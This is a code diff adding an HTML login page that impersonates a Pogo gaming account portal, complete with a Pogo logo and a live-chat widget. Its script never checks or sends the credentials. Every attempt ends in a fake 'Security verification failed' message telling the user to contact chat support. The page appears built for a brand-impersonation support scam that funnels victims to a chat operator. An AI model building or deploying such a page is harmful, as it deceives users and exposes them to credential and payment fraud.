@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pogo Account - Club Login</title>
+
+<link rel="stylesheet" href="style.css">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '8038c0fbc1e30bb63bd04ffc3d2e1081bc26a7b5';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
+</head>
+
+<body>
+
+<header>
+    <div class="header-container">
+
+        <div class="logo">
+            <img src="https://getlogovector.com/wp-content/uploads/2021/05/pogo-logo-vector.png" alt="logo">
+        </div>
+
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Games</a>
+            <a href="#">Community</a>
+            <a href="#">Events</a>
+            <a href="#">Support</a>
+        </nav>
+
+    </div>
+</header>
+
+<section class="hero">
+
+    <!-- LEFT LOGIN -->
+    <div class="login-card">
+
+        <div class="card-icon">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnVvspo4S8-qeCdxv5mDlBANNl_vPninYUNNPlV2L8dWsyYvHJ1_ocoz5D360oKKXsnYaGMRAdG1KG_TxpIQkLym7-sx6DDq-dCQP2RNYVTOJNzvwBUqNQb3dN7r0zUmmNeTQ116_ZxCSaWWHuJKgqltmQXzQe_Dmrj-8BhsKJXoAnQKJWiC_0uSU-/s274/pog.png">
+        </div>
+
+        <h1>Sign in to your Pogo Account</h1>
+        <p class="subtitle">Access your gaming dashboard</p>
+
+        <form id="demoForm">
+
+            <div class="field">
+                <label>Email</label>
+                <input type="email" placeholder="Enter your Phone or Email" required>
+            </div>
+
+            <div class="field">
+                <label>Password</label>
+                <input type="password" placeholder="Enter password" required>
+            </div>
+
+            <a class="forgot" href="#">Forgot Password?</a>
+
+            <button type="submit" class="btn">Login</button>
+
+        </form>
+
+        <div id="loadingBox" class="loading-box">
+            <div class="spinner"></div>
+            <p>Processing...</p>
+        </div>
+
+        <div id="successBox" class="success-box">
+            <h3>Access Restricted</h3>
+            <p>Security verification failed.</p>
+			<p>Please contact Chat support to restore account access.</p>
+        </div>
+
+    </div>
+
+    <!-- RIGHT HERO -->
+    <div class="hero-content">
+
+        <span class="badge">PLAY • COMPETE • CONNECT</span>
+
+        <h2>Home for Fun.</h2>
+
+        <img class="hero-img"
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH39TEdOqvyIzPctnPVZzVPuhVQVDwfyp0RYT1hRFHS6sCIej3EKoSBKKKNw0lBWgTPYJbOHTNAM5DZy1P4yv-ID4z_XuGkpo1rMXoP43sKsPIsWtPhm5ct1NHDYikA4lVsbpKZGMaWkJTKXD8qsypdgvSgRA0Inj16RxGyRc_aAC4M3JM9WUKn3eb/s800/pol.png">
+
+    </div>
+
+</section>
+
+<!-- STATS -->
+<section class="stats">
+
+    <div class="stat">500+<span>Games</span></div>
+    <div class="stat">112M+<span>Players</span></div>
+    <div class="stat">24/7<span>Support</span></div>
+    <div class="stat">100+<span>Events</span></div>
+
+</section>
+
+<!-- FEATURES -->
+<section class="features">
+
+    <div class="card">
+        <h3>🎮 Games</h3>
+        <p>Huge collection of fun games.</p>
+    </div>
+
+    <div class="card">
+        <h3>🏆 Rewards</h3>
+        <p>Unlock achievements & bonuses.</p>
+    </div>
+
+    <div class="card">
+        <h3>👥 Community</h3>
+        <p>Connect with global players.</p>
+    </div>
+
+    <div class="card">
+        <h3>⚡ Events</h3>
+        <p>Join weekly competitions.</p>
+    </div>
+
+</section>
+
+<!-- CTA -->
+<section class="cta">
+    <h2>Ready to Start?</h2>
+    <p>Join the gaming world today.</p>
+    <button>Get Started</button>
+</section>
+
+<footer>
+    <p>© 2026 Gaming Portal</p>
+</footer>
+
+<script>
+document.getElementById("demoForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    document.getElementById("loadingBox").style.display = "block";
+
+    setTimeout(() => {
+        document.getElementById("loadingBox").style.display = "none";
+        document.getElementById("successBox").style.display = "block";
+    }, 2000);
+});
+</script>
+
+</body>
+</html>
